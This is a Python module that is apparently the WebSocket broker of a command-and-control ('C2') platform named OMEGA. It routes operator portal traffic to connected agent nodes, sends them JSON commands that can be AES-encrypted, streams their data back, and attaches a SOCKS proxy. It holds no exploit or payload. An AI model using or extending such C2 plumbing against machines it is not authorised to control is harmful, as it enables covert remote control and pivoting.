import asyncio, orjson, logging
from typing import Dict, Set, Optional
from fastapi import WebSocket
from core.crypto import OmegaCrypto

log = logging.getLogger("OMEGA.broker")

# Shared state — module-level so web_server.py can import them directly
PORTALS: Set[WebSocket] = set()
CLIENTS: Dict[str, WebSocket] = {}
PORTAL_TO_CLIENT: Dict[WebSocket, str] = {}  # portal -> client_id
ENCRYPTED_CLIENTS: Set[str] = set() # Set of client_ids using AES encryption

crypto = OmegaCrypto()

# Lazily import PORTAL_USERS to avoid circular imports
def _get_portal_users():
    try:
        import web_server
        return web_server.PORTAL_USERS
    except Exception:
        return {}

async def _safe_send_text(ws: WebSocket, payload: str, cleanup_set: set = None):
    """Send text to a WebSocket, discarding it from a set on failure."""
    try:
        await ws.send_text(payload)
    except Exception:
        if cleanup_set is not None:
            cleanup_set.discard(ws)


class ConnectionManager:
    """Real-time message broker for the OMEGA C2 platform."""

    # ── Connection Lifecycle ──────────────────────────────────────────────────
    async def connect(self, websocket: WebSocket, client_type: str, client_id: str = None):
        if client_type == "portal":
            PORTALS.add(websocket)
        else:
            if client_id:
                CLIENTS[client_id] = websocket

    def disconnect(self, websocket: WebSocket, db=None):
        PORTALS.discard(websocket)
        PORTAL_TO_CLIENT.pop(websocket, None)
        for cid, ws in list(CLIENTS.items()):
            if ws == websocket:
                del CLIENTS[cid]
                log.info(f"NODE DISCONNECTED: {cid}")
                if db:
                    asyncio.ensure_future(self.broadcast_devices(db))
                break

    # ── Broadcast Helpers ────────────────────────────────────────────────────
    async def broadcast_devices(self, db=None):
        """Push filtered device list to all portals based on user role."""
        if db is None:
            from core.database import Database
            db = Database()

        portal_users = _get_portal_users()
        for portal in list(PORTALS):
            try:
                user = portal_users.get(portal, {'role': 'user'})
                devices = db.get_devices(user_role=user.get('role', 'user'), user_id=user.get('id'))
                active = list(CLIENTS.keys())
                for dev in devices:
                    dev['status'] = 'Online' if dev.get('id') in active else 'Offline'
                payload = orjson.dumps({'t': 'devices', 'data': devices}).decode()
                await portal.send_text(payload)
            except:
                PORTALS.discard(portal)


    async def broadcast_to_portals(self, data: bytes, client_id: str = None):
        """Low-latency binary broadcast — only to portals watching client_id."""
        for portal, watching_id in list(PORTAL_TO_CLIENT.items()):
            if client_id is None or watching_id == client_id:
                try:
                    await portal.send_bytes(data)
                except:
                    PORTALS.discard(portal)

    async def broadcast_text_to_portals(self, text: str, client_id: str = None):
        """Text-based broadcast — only to portals watching client_id."""
        if client_id is not None:
            # Targeted: only portals watching this specific client
            for portal, watching_id in list(PORTAL_TO_CLIENT.items()):
                if watching_id == client_id:
                    await _safe_send_text(portal, text, PORTALS)
        else:
            # Broadcast to all portals (e.g. system events)
            for portal in list(PORTALS):
                await _safe_send_text(portal, text, PORTALS)

    async def send_to_node(self, client_id: str, data: dict):
        """Send a structured JSON message to a specific agent node (with optional AES encryption)."""
        ws = CLIENTS.get(client_id)
        if ws:
            try:
                payload = orjson.dumps(data).decode()
                if client_id in ENCRYPTED_CLIENTS:
                    # Encrypt the JSON payload
                    payload = crypto.encrypt(payload, client_id)
                await ws.send_text(payload)
            except Exception:
                CLIENTS.pop(client_id, None)
                ENCRYPTED_CLIENTS.discard(client_id)

    # ── SOCKS Proxy Integration ──────────────────────────────────────────────
    def init_socks(self):
        from core.socks import SocksManager
        self.socks = SocksManager(self)
        return self.socks

